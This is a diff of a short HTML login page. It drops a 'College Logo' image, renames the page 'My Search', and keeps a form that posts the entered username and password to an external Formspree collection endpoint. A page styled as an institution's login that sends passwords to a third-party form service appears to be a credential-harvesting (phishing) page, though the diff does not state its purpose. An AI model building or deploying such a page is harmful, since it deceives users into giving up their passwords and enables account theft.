@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login</title>
+  <title>My Search Login</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -18,12 +18,8 @@
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 320px;
+      width: 300px;
       text-align: center;
-    }
-    .login-box img.logo {
-      width: 100px;
-      margin-bottom: 15px;
     }
     .login-box h2 {
       margin-bottom: 20px;
@@ -55,19 +51,14 @@
 </head>
 <body>
 
-  <!-- Formspree form -->
+  <!-- Replace with your Formspree endpoint -->
   <form class="login-box" action="https://formspree.io/f/mwpnwoyn" method="POST">
-    <!-- College Logo -->
-    <img src="logo.png" alt="College Logo" class="logo">
-    <h2>Login</h2>
+    <h2>My Search</h2>
     <input type="text" name="username" placeholder="Username" required>
     <input type="password" name="password" placeholder="Password" required>
-    
-    <!-- Optional: redirect to thank you page after submission -->
-    <!-- <input type="hidden" name="_redirect" value="thankyou.html"> -->
-    
     <button type="submit">Login</button>
   </form>
 
 </body>
 </html>
+
